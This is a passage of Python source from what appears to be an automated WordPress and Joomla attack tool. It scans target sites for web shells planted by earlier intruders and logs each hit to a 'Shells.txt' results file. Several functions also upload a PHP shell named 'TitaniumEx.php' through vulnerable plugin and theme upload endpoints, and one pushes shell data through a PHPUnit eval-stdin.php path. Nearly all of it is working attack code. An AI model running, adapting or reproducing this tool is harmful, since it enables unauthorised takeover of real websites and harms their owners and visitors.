            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X44(url):
    try:
        upload_dir = url +"/wp-content/plugins/ccx/index.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'Negat1ve Shell' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass

def X45(url):
    try:
        upload_dir = url +"/wp-content/plugins/instabuilder2/cache/up.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'input type="submit" name="upload" value="upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X46(url):
    try:
        upload_dir = url +"/wp-content/plugins/TOPXOH/wDR.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'input class="toolsInp" type="file" name="f"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X47(url):
    try:
        upload_dir = url +"/wp-includes/wp-class.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'input class="toolsInp" type="file" name="f[]" multiple=""' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X48(url):
    try:
        upload_dir = url +"/shell20211028.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'input class="toolsInp" type="file" name="f"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X49(url):
    try:
        upload_dir = url +"/wp-content/shell20211028.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'input class="toolsInp" type="file" name="f"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X50(url):
    try:
        upload_dir = url +"/wp-includes/ID3/wp-conflg.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'Negat1ve Shell' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X51(url):
    try:
        upload_dir = url +"/wp-content/plugins/sid/sidwso.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'Uname' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X52(url):
    try:
        upload_dir = url +"/wp-content/plugins/anttt/simple.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'input type="file" id="inputfile" name="inputfile"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X53(url):
    try:
        upload_dir = url +"/wp-content/plugins/wp-file-upload/ROOBOTS.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'Upl0od' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X54(url):
    try:
        upload_dir = url +"/wso.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'Uname' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X55(url):
    try:
        shellname = "TitaniumEx.php"
        headersup = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
                                        'Content-Type':'multipart/form-data; boundary=---------------------------28844570734231014052285756257'}
        data = '-----------------------------28844570734231014052285756257\r\n'
        data += 'Content-Disposition: form-data; name="a"; filename="{}"\r\n'.format(shellname)
        data += 'Content-Type: text/plain\r\n'
        data += '\r\n'
        data += '{}\r\n'.format(shell)
        data += '-----------------------------28844570734231014052285756257\r\n'
        data += 'Content-Disposition: form-data; name="x"\r\n'
        data += '\r\n'
        data += 'x\r\n'
        data += '-----------------------------28844570734231014052285756257--\r\n'
        data = data.encode("utf-8")
        urlx = url +"/wp-content/plugins/xwp/up.php"
        upload_dir = url +"/wp-content/plugins/xwp/TitaniumEx.php?Titanium=Ex"
        xex = requests.post(urlx,headers=headersup,data=data,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in str(xe.text):
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X56(url):
    try:
        upload_dir = url +"/wso123.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'Uname' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X57(url):
    try:
        shellname = "TitaniumEx.php"
        headersup = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
                                        'Content-Type':'multipart/form-data; boundary=---------------------------797575287704659169831762525'}
        data = '-----------------------------797575287704659169831762525\r\n'
        data += 'Content-Disposition: form-data; name="uploadfile[]"; filename="{}"\r\n'.format(shellname)
        data += 'Content-Type: application/octet-stream\r\n'
        data += '\r\n'
        data += '{}\r\n'.format(shell)
        data += '-----------------------------797575287704659169831762525--\r\n'
        data = data.encode("utf-8")
        urlx = url +"/wp-content/plugins/ccx/index.php"
        upload_dir = url +"/wp-content/plugins/ccx/TitaniumEx.php?Titanium=Ex"
        xex = requests.post(urlx,headers=headersup,data=data,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in str(xe.text):
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X58(url):
    try:
        shellname = "TitaniumEx.php"
        headersup = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
                                        'Content-Type':'multipart/form-data; boundary=---------------------------79757528770465916983176252'}
        data = '-----------------------------79757528770465916983176252\r\n'
        data += 'Content-Disposition: form-data; name="uploadfile[]"; filename="{}"\r\n'.format(shellname)
        data += 'Content-Type: application/octet-stream\r\n'
        data += '\r\n'
        data += '{}\r\n'.format(shell)
        data += '-----------------------------79757528770465916983176252--\r\n'
        data = data.encode("utf-8")
        urlx = url +"/ccx/index.php"
        upload_dir = url +"/ccx/TitaniumEx.php?Titanium=Ex"
        xex = requests.post(urlx,headers=headersup,data=data,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in str(xe.text):
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X59(url):
    try:
        upload_dir = url +"/administrator/components/com_xcloner-backupandrestore/index2.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'Authentication Area:' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X60(url):
    try:
        upload_dir = url +"/wp-content/plugins/index.php?0DAY=Spamworldpro"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X61(url):
    try:
        upload_dir = url +"/wp-content/plugins/cache-wordpress/payment.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X62(url):
    try:
        upload_dir = url +"/SpamworldSec.php?0DAY=Spamworldpro"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X63(url):
    try:
        upload_dir = url +"/wp-content/index.php?0DAY=Spamworldpro"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X64(url):
    try:
        upload_dir = url +"/wp-content/index.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'type"submit" value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X65(url):
    try:
        myup = {'Filedata': ('TitaniumEx.php', shell)}
        upload_dir = url +"/wp-content/uploads/settingsimages/TitaniumEx.php?Titanium=Ex"
        urlx = url+"/wp-content/themes/RightNow/includes/uploadify/upload_settings_image.php"
        xex = requests.post(urlx,data=myup,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X66(url):
    try:
        upload_dir = url +"/TitaniumEx.php?Titanium=Ex"
        urlx = url+"/wp-content/plugins/indeed-membership-pro/classes/PaymentGateways/mollie/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
        xex = requests.get(urlx,data=shell_data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X67(url):
    try:
        upload_dir = url +"/wp-content/index.php?0DAY=Spamworldpro"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
